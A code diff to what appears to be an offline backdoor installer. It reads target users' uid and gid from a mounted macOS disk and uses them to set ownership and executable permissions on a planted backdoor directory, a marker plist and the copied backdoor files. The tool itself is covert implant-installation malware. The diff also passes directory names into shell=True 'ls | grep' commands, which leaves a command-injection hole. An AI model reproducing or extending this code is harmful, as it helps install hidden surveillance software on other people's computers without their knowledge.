@@ -388,7 +388,22 @@ class OfflineInstall(object):
 			if i[0] == '.' or i == "shared" or i == "Shared":
 				continue
 
-			self.useosx.append({'username': i, 'home': '/Users/' + i, 'fullname': "", 'status': None})
+			uid = None
+			gid = None
+
+			try:
+				uid = subprocess.check_output("\ls -ln /mnt/Users/ | grep -i '{}$' | awk '{{print $3}}'".format(i), shell=True).decode('utf-8')[:-1]
+			except:
+				uid = None
+				pass
+
+			try:
+				gid = subprocess.check_output("\ls -ln /mnt/Users/ | grep -i '{}$' | awk '{{print $4}}'".format(i), shell=True).decode('utf-8')[:-1]
+			except:
+				gid = None
+				pass
+
+			self.useosx.append({'username': i, 'uid': uid, 'gid': gid, 'home': '/Users/' + i, 'fullname': "", 'status': None})
 
 		if self.useosx == []:
 			self.useosx = None
@@ -501,7 +516,7 @@ class OfflineInstall(object):
 
 			for u in user:
 				if u == line[0]:
-					self.uselin.append({'username': line[0], 'uid': line[2], 'home': "/home/" + line[0], 'fullname': line[4].replace(",", ""), 'status': None})
+					self.uselin.append({'username': line[0], 'uid': line[2], 'gid': line[3], 'home': "/home/" + line[0], 'fullname': line[4].replace(",", ""), 'status': None})
 
 		if self.uselin == []:
 			self.uselin = None
@@ -1184,6 +1199,8 @@ class OfflineInstall(object):
 			return False
 
 		home = None
+		uid = None
+		gid = None
 
 		for i in self.useosx:
 			if i['username'] == user:
@@ -1197,6 +1214,8 @@ class OfflineInstall(object):
 					return False
 
 				home = i['home']
+				uid = i['uid']
+				gid = i['gid']
 				break
 
 		#
@@ -1236,6 +1255,8 @@ class OfflineInstall(object):
 			print("    Create tmp backdoor directory [ERROR] -> " + temp_backdoor_path)
 			pass
 
+		os.chown(temp_backdoor_path, int(uid), int(gid))
+
 		#
 		# Crea l'mdworker per il primo avvio
 		##
@@ -1268,6 +1289,8 @@ class OfflineInstall(object):
 		hfile = open(plist_path, "w")
 		hfile.write("00")
 		hfile.close()
+		os.chown(plist_path, int(uid), int(gid))
+		os.chmod(plist_path, 0o755)
 
 		print("    Create Marker in the tmp backdoor directory [OK] -> " + plist_path)
 
@@ -1308,6 +1331,9 @@ class OfflineInstall(object):
 			tmp_path = files_path + "/" + hfind
 			tmp_path2 = temp_backdoor_path + "/" + hfind
 			shutil.copyfile(tmp_path, tmp_path2)
+			os.chown(tmp_path2, int(uid), int(gid))
+			os.chmod(tmp_path2, 0o755)
+
 			print("    Copyring backdoor file [OK] -> " + tmp_path + " -> " + tmp_path2)
 		try:
 			ret = subprocess.check_output("umount /mnt2/ 2> /dev/null", shell=True)
